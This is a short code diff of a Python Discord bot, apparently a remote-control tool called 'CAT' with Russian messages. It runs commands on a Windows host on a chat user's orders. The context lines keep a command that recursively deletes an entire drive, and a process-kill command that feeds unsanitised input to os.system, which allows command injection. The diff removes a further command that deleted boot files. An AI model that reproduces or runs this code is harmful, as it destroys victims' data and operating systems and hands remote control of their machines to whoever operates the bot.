@@ -101,7 +101,7 @@ async def command(ctx, *, todo):
 @bot.command()
 async def kill(ctx, *, process):  # убить процесс
     output = os.system(f'taskkill /im {str(process)} /f')
-    if output == 0:
+    if not output:
         await ctx.send('**CAT:** Процесс успешно убит!')
     else:
         await ctx.send('**CAT:** Такого процесса нет или вы указали непраильный процесс!')
@@ -133,12 +133,6 @@ async def delete(ctx, file_on_delete):  # удалить файл
 async def disk_format(ctx, disk):  # форматирование диска
     await ctx.send(f'**CAT:** Форматирую диск **{disk}**!')
     os.system(f'rd/s/q {disk}:\\')
-
-
-@bot.command()
-async def system_kill(ctx):  # удаление загрузочных файлов
-    await ctx.send('**CAT:** Система убита!')
-    os.system(config.system_kill)
 
 
 @bot.command()
